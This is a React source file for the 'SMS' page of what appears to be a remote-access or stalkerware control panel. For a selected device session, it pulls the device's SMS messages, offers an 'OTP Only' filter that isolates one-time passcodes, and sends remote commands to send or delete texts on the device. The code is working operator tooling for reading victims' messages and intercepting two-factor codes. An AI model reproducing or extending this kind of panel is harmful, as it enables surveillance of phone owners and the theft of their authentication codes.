import React, { useState } from 'react';
import { useDeviceStore } from '../../store/deviceStore';
import { useQuery } from '@tanstack/react-query';
import axios from 'axios';
import { MessageSquare, Send, Trash2, Download, Filter } from 'lucide-react';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000';

export default function SMS() {
  const { selectedDevice, sendCommand } = useDeviceStore();
  const [filter, setFilter] = useState('all');
  const [newSms, setNewSms] = useState({ number: '', message: '' });

  const { data: smsList = [], refetch } = useQuery({
    queryKey: ['sms', selectedDevice?.sessionId, filter],
    queryFn: async () => {
      const type = filter === 'all' ? undefined : filter;
      const otpOnly = filter === 'otp';
      const res = await axios.get(
        `${API_URL}/api/devices/${selectedDevice.sessionId}/sms?type=${type}&otpOnly=${otpOnly}`,
        { headers: { Authorization: `Bearer ${localStorage.getItem('authToken')}` } }
      );
      return res.data;
    },
    enabled: !!selectedDevice,
    refetchInterval: 10000,
  });

  const handleSendSms = () => {
    if (!selectedDevice || !newSms.number || !newSms.message) return;
    sendCommand(selectedDevice.sessionId, 'sms:send', newSms);
    setNewSms({ number: '', message: '' });
  };

  const handleDeleteSms = (id) => {
    sendCommand(selectedDevice.sessionId, 'sms:delete', { id });
  };

  return (
    <div className="p-6 space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-text mb-1">💬 SMS Messages</h1>
        <p className="text-textMuted">View, send, and manage SMS messages</p>
      </div>

      {!selectedDevice ? (
        <div className="card text-center py-12">
          <MessageSquare className="w-16 h-16 text-textMuted mx-auto mb-4" />
          <p className="text-textMuted">Select a device to access SMS</p>
        </div>
      ) : (
        <>
          <div className="card">
            <h3 className="text-lg font-semibold text-text mb-4">Send SMS</h3>
            <div className="flex gap-3">
              <input
                type="text"
                placeholder="Phone number"
                value={newSms.number}
                onChange={(e) => setNewSms({ ...newSms, number: e.target.value })}
                className="input-field flex-1"
              />
              <input
                type="text"
                placeholder="Message"
                value={newSms.message}
                onChange={(e) => setNewSms({ ...newSms, message: e.target.value })}
                className="input-field flex-1"
              />
              <button onClick={handleSendSms} className="btn-primary flex items-center gap-2">
                <Send className="w-4 h-4" /> Send
              </button>
            </div>
          </div>

          <div className="card">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold text-text">Messages ({smsList.length})</h3>
              <div className="flex gap-2">
                <select value={filter} onChange={(e) => setFilter(e.target.value)} className="input-field">
                  <option value="all">All</option>
                  <option value="inbox">Inbox</option>
                  <option value="sent">Sent</option>
                  <option value="otp">OTP Only</option>
                </select>
              </div>
            </div>
            <div className="space-y-3 max-h-96 overflow-y-auto">
              {smsList.length === 0 ? (
                <p className="text-textMuted text-center py-8">No messages found</p>
              ) : (
                smsList.slice(0, 50).map((sms) => (
                  <div key={sms._id} className="p-4 bg-surface2/50 rounded-lg border border-border">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <span className="font-semibold text-text">{sms.phoneNumber}</span>
                        <span className={`px-2 py-0.5 rounded-full text-xs ${
                          sms.type === 'inbox' ? 'bg-primary/10 text-primary' : 'bg-secondary/10 text-secondary'
                        }`}>{sms.type}</span>
                        {sms.isOtp && <span className="px-2 py-0.5 bg-success/20 text-success text-xs rounded">OTP</span>}
                      </div>
                      <span className="text-xs text-textMuted">{new Date(sms.timestamp).toLocaleString()}</span>
                    </div>
                    <p className="text-sm text-textMuted mb-2">{sms.message}</p>
                    <button onClick={() => handleDeleteSms(sms._id)} className="text-xs text-error hover:underline">
                      <Trash2 className="w-3 h-3 inline" /> Delete
                    </button>
                  </div>
                ))
              )}
            </div>
          </div>
        </>
      )}
    </div>
  );
}